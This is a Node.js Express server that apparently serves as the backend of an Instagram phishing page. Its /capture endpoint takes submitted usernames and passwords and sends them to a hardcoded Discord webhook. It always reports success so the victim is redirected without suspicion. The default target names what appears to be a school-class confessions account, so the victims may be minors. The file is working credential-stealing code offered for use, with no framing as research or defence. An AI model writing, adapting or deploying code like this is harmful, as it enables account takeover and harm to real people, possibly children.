const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1492399854146687059/UAJocFgvbeBPDSW9zSFcAyM4JZSnwI8kWqX_n_3QBFe9GzyXUDeyGOhVbowFi1Vrg86Y";

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));   // serves index.html and 1.html

app.post('/capture', async (req, res) => {
    const { username, password, target, time } = req.body;

    console.log(`[Captured] Username: ${username} | Target: ${target}`);

    const payload = {
        content: "**Instagram Login Captured**",
        embeds: [{
            color: 0x0095f6,
            fields: [
                { name: "Username / Email", value: username || "N/A", inline: false },
                { name: "Password", value: password ? "||" + password + "||" : "N/A", inline: false },
                { name: "Target", value: target || "smrj.class9.confessions", inline: false },
                { name: "Time", value: time || new Date().toLocaleString(), inline: false }
            ]
        }]
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("✅ Sent to Discord successfully");
        } else {
            const errorText = await response.text();
            console.error(`❌ Discord error ${response.status}:`, errorText);
        }
    } catch (err) {
        console.error("❌ Webhook fetch failed:", err.message);
    }

    // Always return success to frontend so it redirects
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
});
